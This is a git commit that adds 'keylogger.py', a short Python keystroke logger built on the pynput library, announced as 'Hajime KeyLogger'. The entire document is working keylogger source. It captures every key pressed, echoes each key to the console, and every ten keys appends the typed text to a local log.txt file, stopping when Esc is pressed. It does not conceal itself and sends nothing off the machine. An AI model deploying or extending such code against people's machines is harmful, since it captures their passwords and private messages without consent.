21f27a90573e51d27b144eec0a13712a5cf71228
arafMustavi <arafmustavi@gmail.com>
2021-01-13 12:34:54 +0600

    :tada: Hajime KeyLogger

---
+++ keylogger.py
@@ -0,0 +1,37 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+keys = []
+count = 0
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+
+
+def write_file(keys):
+    with open("log.txt",'a') as file:
+        for key in keys:
+            k = str(key).replace("'","")
+
+            if k.find("space") > 0 :
+                file.write("\n")
+
+            elif k.find("Key") == -1:
+                file.write(k)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
